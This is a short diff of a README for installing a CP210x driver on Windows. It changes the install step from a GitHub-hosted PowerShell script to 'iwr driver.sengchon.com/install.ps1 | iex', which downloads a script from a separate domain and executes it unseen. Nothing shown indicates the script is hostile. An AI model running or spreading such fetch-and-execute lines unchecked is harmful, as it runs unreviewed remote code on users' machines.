@@ -3,6 +3,6 @@
 ## For Windows User:
 1. run
    ```
-    lsiwr https://raw.githubusercontent.com/dennischang928/CP210x-driver-cmd-install/refs/heads/main/install-cp210x.ps1 | iex
+    iwr driver.sengchon.com/install.ps1 | iex
    ```
 
